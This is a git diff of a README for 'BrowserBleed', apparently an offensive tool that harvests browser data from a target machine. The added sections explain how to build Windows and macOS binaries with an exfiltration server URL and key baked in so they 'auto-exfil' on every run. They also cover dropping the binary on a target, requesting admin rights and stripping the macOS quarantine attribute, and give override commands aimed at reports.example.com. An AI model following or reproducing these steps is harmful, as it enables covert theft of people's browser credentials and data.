@@ -231,52 +231,72 @@ To update the binary after code changes:
 bash deploy/deploy-binary.sh   # rebuilds, uploads, restarts service
 ```
 
-### Using `--exfil` in an engagement
-
-```bash
-# Windows
-BrowserBleed.exe --exfil https://reports.yourdomain.com --exfil-key YOUR_API_KEY
-
-# macOS
-sudo ./BrowserBleed_mac --exfil https://reports.yourdomain.com --exfil-key YOUR_API_KEY
-```
-
-The report URL is printed in `bb_results.txt` and accessible in the browser at `https://reports.yourdomain.com/` after logging in with the API key.
-
 ---
 
-## Building
+## Building your own binaries
 
-### Windows
+Binaries are **not distributed** — you build your own with your report server baked in. This keeps your server URL and API key out of any shared binary and off GitHub.
 
-```powershell
-pip install cryptography pyinstaller
-python -m PyInstaller --onefile --noconsole --uac-admin --name BrowserBleed `
-    --distpath . --workpath $env:TEMP\bb_build --specpath $env:TEMP\bb_build `
-    BrowserBleed.py
+### Prerequisites
+
+```
+pip install cryptography pyinstaller   # Windows (PowerShell)
+pip3 install cryptography pyinstaller  # macOS
 ```
 
-### macOS
+Go 1.22+ is required only to build the report server binary.
+
+### Step 1 — Deploy the report server
+
+Follow the [Report Server](#report-server) deploy steps above. When done, `deploy/config` will contain your `DOMAIN` and `BB_API_KEY`.
+
+### Step 2 — Build for Windows
+
+```powershell
+.\build_windows.ps1
+```
+
+Reads `DOMAIN` and `BB_API_KEY` from `deploy/config`, substitutes them into a temp copy of the source, and produces `BrowserBleed.exe` in the repo root. The exe auto-exfils on every run — no flags needed on target.
+
+To point at a different server without editing config:
+```powershell
+.\build_windows.ps1 -ExfilUrl https://reports.example.com -ExfilKey mykey
+```
+
+### Step 3 — Build for macOS
 
 ```bash
-pip3 install cryptography pyinstaller
 chmod +x build_mac.sh && ./build_mac.sh
 ```
 
-The build script strips the Gatekeeper quarantine attribute automatically. If you re-download the binary, run:
+Same substitution via `sed`, produces `BrowserBleed_mac`. The build script also strips the Gatekeeper quarantine attribute automatically. If you move or re-download the binary:
 ```bash
 xattr -dr com.apple.quarantine BrowserBleed_mac
 ```
 
-### Report server
+To override:
+```bash
+EXFIL_URL=https://reports.example.com EXFIL_KEY=mykey ./build_mac.sh
+```
+
+### Dropping on a target
+
+```
+BrowserBleed.exe          # Windows — exfils automatically, no flags needed
+sudo ./BrowserBleed_mac   # macOS — same
+```
+
+The report URL is appended to `bb_results.txt` and visible in the browser at your server after logging in with the API key.
+
+### Rebuilding after source changes
+
+Re-run the build script — it always patches a temp copy, so the source files stay clean (no credentials in the `.py` files ever).
+
+### Report server binary (local dev/test)
 
 ```bash
-# Local dev/test
 cd server
 go run ./cmd/server -- --api-key testkey --enc-key $(openssl rand -hex 32) --data-dir /tmp/bb-data --base-url http://localhost:8080
-
-# Production (handled by deploy-binary.sh)
-cd server && GOOS=linux GOARCH=amd64 go build -ldflags "-s -w" -o ../deploy/server-linux ./cmd/server/
 ```
 
 ---
